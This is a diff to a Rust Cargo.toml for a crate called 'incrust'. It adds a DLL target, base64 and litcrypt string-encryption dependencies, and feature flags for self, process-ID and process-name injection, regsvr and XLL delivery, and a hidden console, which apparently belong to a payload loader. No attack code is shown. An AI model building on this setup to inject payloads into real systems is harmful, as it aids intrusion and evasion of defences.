@@ -3,10 +3,30 @@ name = "incrust"
 version = "0.1.0"
 edition = "2021"
 
+[lib]
+name = "incrustdll"
+path = "src/lib.rs"
+crate-type = ["cdylib"]
+
+[[bin]]
+name = "incrust"
+path = "src/bin.rs"
+
 # See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
 
 [dependencies]
+base64 = "0.21.5"
+litcrypt = "0.3.0"
 rand = "0.8.5"
+
+[features]
+default = ["inject_self"]
+no_console = []
+regsvr = []
+xll = []
+inject_self = []
+inject_proc_id = []
+inject_proc_name = []
 
 [profile.release]
 strip = true  # Automatically strip symbols from the binary.
